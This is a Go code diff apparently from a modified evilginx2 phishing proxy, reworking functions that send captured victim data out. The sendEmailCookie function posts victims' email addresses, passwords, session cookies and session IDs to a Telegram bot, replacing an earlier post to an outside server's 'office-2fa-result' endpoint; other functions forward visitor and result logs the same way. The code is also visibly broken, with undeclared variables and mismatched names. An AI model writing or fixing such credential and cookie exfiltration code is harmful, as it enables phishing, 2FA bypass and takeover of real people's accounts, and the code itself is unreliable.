@@ -13,6 +13,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	
+	log "github.com/sirupsen/logrus"
 )
 
 type Smtp struct {
@@ -35,83 +37,70 @@ func goDotEnvVariable(key string) string {
 	return os.Getenv(key)
 }
 
-func telegramSendResult(msg string) {
+func getUrl() string {
+	// godotenv package
+  	Token := goDotEnvVariable("TOKEN")
+	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
+}
+
+func telegramSendResult(msg string) (bool, error){
+	// Global variables
+	var err error
+	var response *http.Response
+	ChatId := goDotEnvVariable("CHAT_ID")
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
+	// Send the message
+	url := fmt.Sprintf("%s/sendMessage", getUrl())
+	body, _ := json.Marshal(map[string]string{
+		"chat_id": ChatId,
+		"text":    msg,
+	})
+	responseBody := bytes.NewBuffer(body)
+	request, _ := http.Post(url, "application/json", responseBody)
+	if err != nil {
+		return false, err
+	}
+
+	// Close the request at the end
+	defer response.Body.Close()
+	
+	// Body
+	body, err = ioutil.ReadAll(request.Body)
+	if err != nil {
+		return false, err
+	}
 	log.Printf("%s", msg)
-	//response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
-	//if err != nil {
-	//	fmt.Printf("%s", err)
-	//}
-	//
-	//var smtp Smtp
-	//
-	//responseData, err := ioutil.ReadAll(response.Body)
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
-	//json.Unmarshal(responseData, &smtp)
-	//
-	//file, err := os.Open("/root/evilginx2-master/database/result.txt")
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
-	//defer func() {
-	//	if err = file.Close(); err != nil {
-	//		log.Fatal(err)
-	//	}
-	//}()
-	//
-	//b, err := ioutil.ReadAll(file)
-	//data := string(b)
-	//
-	//m := gomail.NewMessage()
-	//
-	//// Set E-Mail sender
-	//m.SetHeader("From", smtp.Username)
-	//
-	//// Set E-Mail receivers
-	//m.SetHeader("To", data)
-	//
-	//// Set E-Mail subject
-	//m.SetHeader("Subject", "RESULT IS COMING")
-	//
-	//// Set E-Mail body. You can set plain text or html with text/html
-	//m.SetBody("text/plain", msg)
-	//
-	//// Settings for SMTP server
-	//d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
-	//
-	//// This is only needed when SSL/TLS certificate is not valid on server.
-	//// In production this should be set to false.
-	//// d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
-	//
-	//// Now send E-Mail
-	//if err = d.DialAndSend(m); err != nil {
-	//	fmt.Println(err)
-	//
-	//}
-	//
-	//return
+	// Return
+	return true, nil
 
 }
 
-func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
+func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) (bool, error){
+	
+	// Global variables
+	var err error
+	var response *http.Response
+	ChatId := goDotEnvVariable("CHAT_ID")
+	
+	// Send the message
+	url := fmt.Sprintf("%s/sendMessage", getUrl())
 
 	postBody, _ := json.Marshal(map[string]string{
-		"email":      username,
-		"password":   password,
-		"cookie":     msg,
-		"key_user":   KeyUser,
-		"session_id": sessionId,
+		"chat_id":    ChatID,
+		" 🌟 Email ":      username,
+		" 🔑 Password ":   password,
+		" 🍪 Cookie_results":     msg,
+		" 🏷️ Key_user":   KeyUser,
+		" 💻 Session_id ": sessionId,
 	})
 
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, _ := http.Post("https://vanilla.500daysofspring.com/public/api/office-2fa-result", "application/json", responseBody)
+	request, _ := http.Post(url, "application/json", responseBody)
 
 	defer request.Body.Close()
 
-	log.Println("Send Email Cookies")
+	log.Println("Send Email/Telegram Cookies")
 
 	err := os.WriteFile("Cookies.json", []byte(msg), 0755)
 	if err != nil {
@@ -121,48 +110,32 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 	return
 }
 
-func telegramSendVisitor(msg string) {
-	// msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
+func telegramSendVisitor(msg string) (bool, error){
+	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
+	
+	// Send the message
+	url := fmt.Sprintf("%s/sendMessage", getUrl())
+	body, _ := json.Marshal(map[string]string{
+		"chat_id": ChatId,
+		"text":    msg,
+	})
+	responseBody := bytes.NewBuffer(body)
+	request, _ := http.Post(url, "application/json", responseBody)
+	if err != nil {
+		return false, err
+	}
 
-	// from := os.Getenv("MAIL")
-	// password := os.Getenv("PASSWD")
-
-	// // toList is list of email address that email is to be sent.
-	// toList := []string{"example@gmail.com"}
-
-	// // host is address of server that the
-	// // sender's email address belongs,
-	// // in this case its gmail.
-	// // For e.g if your are using yahoo
-	// // mail change the address as smtp.mail.yahoo.com
-	// host := "smtp.gmail.com"
-
-	// // Its the default port of smtp server
-	// port := "587"
-
-	// // We can't send strings directly in mail,
-	// // strings need to be converted into slice bytes
-	// body := []byte(msg)
-
-	// // PlainAuth uses the given username and password to
-	// // authenticate to host and act as identity.
-	// // Usually identity should be the empty string,
-	// // to act as username.
-	// auth := smtp.PlainAuth("", from, password, host)
-
-	// // SendMail uses TLS connection to send the mail
-	// // The email is sent to all address in the toList,
-	// // the body should be of type bytes, not strings
-	// // This returns error if any occurred.
-	// err := smtp.SendMail(host+":"+port, auth, from, toList, body)
-
-	// // handling the errors
-	// if err != nil {
-	//     fmt.Println(err)
-	//     os.Exit(1)
-	// }
-
+	// Close the request at the end
+	defer response.Body.Close()
+	
+	// Body
+	body, err = ioutil.ReadAll(request.Body)
+	if err != nil {
+		return false, err
+	}
 	fmt.Println("Successfully sent mail to all user in telegram: %s", msg)
+	// Return
+	return true, nil
 }
 
 type Database struct {
